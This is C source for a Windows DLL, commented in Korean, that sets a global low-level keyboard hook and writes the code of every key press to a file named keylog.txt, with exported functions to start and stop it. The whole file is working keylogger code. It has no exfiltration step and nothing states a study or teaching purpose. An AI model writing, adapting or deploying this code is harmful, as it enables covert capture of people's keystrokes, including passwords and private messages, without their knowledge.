#include <windows.h>
#include <stdio.h>

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
FILE *logFile;

// DLL 진입점
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            g_hInstance = hinstDLL;
            break;
        case DLL_PROCESS_DETACH:
            if (logFile) {
                fclose(logFile);
            }
            break;
    }
    return TRUE;
}

// 키보드 후킹 프로시저
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {  // 유효한 메시지만 처리
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;

        if (wParam == WM_KEYDOWN) {  // 키가 눌릴 때만 처리
            // 키 코드 로그 파일에 기록
            if (logFile) {
                fprintf(logFile, "Key Pressed: %d\n", pKey->vkCode);
                fflush(logFile);  // 버퍼를 즉시 파일에 기록
            }
        }
    }

    // CallNextHookEx로 다음 후킹 프로시저에 전달
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

__declspec(dllexport) void HookStart() {
    // 로그 파일 생성
    logFile = fopen("keylog.txt", "a");
    if (!logFile) {
        MessageBox(NULL, "Failed to open log file.", "Error", MB_OK);
        return;
    }

    // 키보드 후킹 설정
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, g_hInstance, 0);
}

__declspec(dllexport) void HookStop() {
    // 후킹 해제
    if (g_hHook) {
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
    }

    // 로그 파일 닫기
    if (logFile) {
        fclose(logFile);
        logFile = NULL;
    }
}
